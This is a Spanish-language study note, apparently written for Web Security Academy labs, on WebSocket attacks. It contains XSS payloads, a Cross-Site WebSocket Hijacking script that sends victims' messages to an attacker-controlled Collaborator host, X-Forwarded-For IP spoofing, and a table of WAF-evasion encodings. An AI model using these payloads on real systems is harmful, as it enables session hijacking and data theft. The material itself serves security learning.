
---
Tags: - #vulnerability/cswsh #vulnerability/xss-ws #protocol/websocket #handshake-manipulation #tool/burp-websockets #env/web-security-academy #exfiltration

---
# Índice

- [[#1. Manipulación de Mensajes (Client-Side Injection)]]
	
- [[#2. Cross-Site WebSocket Hijacking (CSWSH)]]
	
- [[#3. Manipulación del Handshake (WAF Bypass)]]
	
- [[#Tabla de Técnicas de Evasión]]
---
## 1. Manipulación de Mensajes (Client-Side Injection)

El servidor confía ciegamente en los datos enviados por el socket y los refleja en el DOM.

- **Flujo:**
    
    1. Abrir el chat/función de WebSockets.
        
    2. Interceptar el frame en **Burp Suite (WebSockets history)**.
        
    3. Modificar el valor del JSON inyectando el payload.
        
- **Ejemplo:** 

```json
  {
  "message":"<img src=0 onerror=alert(0)>"
  }
```

---
## 2. Cross-Site WebSocket Hijacking (CSWSH)

Aprovecha que el navegador envía cookies automáticamente en el _handshake_ (petición inicial de conexión).

- **Flujo:**
    
    1. **Víctima** visita una web maliciosa controlada por el atacante.
        
    2. **Script atacante** inicia una conexión `new WebSocket("wss://vulnerable.com")`.
        
    3. El navegador envía la **cookie de sesión** de la víctima.
        
    4. El socket se abre bajo la identidad de la víctima; el atacante lee sus mensajes.
        
- **Exploit Code:**
    
```JavaScript
const w = "wss://vulnerable-id.net/chat";
const c = "https://tu-collab.oastify.com";
const s = new WebSocket(w);

s.onopen = () => s.send("READY"); // Inicia flujo
s.onmessage = e => fetch(`${c}/?data=${btoa(e.data)}`, {mode:'no-cors'}); // Exfiltra en Base64
```

---
## 3. Manipulación del Handshake (WAF Bypass)

Si la conexión se corta o el payload es bloqueado, atacamos la **petición HTTP de Upgrade**.

- **Flujo:**
    
    1. Identificar bloqueo (ej: IP baneada o 403 Forbidden). Podemos usar la cabecera `X-Forwarded-For: 127.0.0.1` para evadir baneo de IP / Reglas locales.
        
    2. Interceptar el HTTP Upgrade en el Proxy.
        
    3. Añadir cabeceras de spoofing o modificar el payload del mensaje para evadir firmas.

Ejemplo:

```json
{
"message":"<img src=0 OnErRoR=alert`1`>"
}
```

### Tabla de Técnicas de Evasión

|**Técnica**|**Ejemplo Payload / Cabecera**|**Explicación**|
|---|---|---|
|**IP Spoofing**|`X-Forwarded-For: 127.0.0.1`|Engaña al servidor para saltar bloqueos de IP.|
|**Ofuscación**|`OnErRoR=alert`1``|Usa _Backticks_ y _Mixed Case_ para saltar filtros de texto.|
|**Null Byte**|`{"msg":"<img...\0>"}`|Intenta que el filtro deje de leer antes de detectar el tag.|
|**Encoding**|`\u003cimg src=x...`|Usa representación Unicode para esconder etiquetas HTML.|
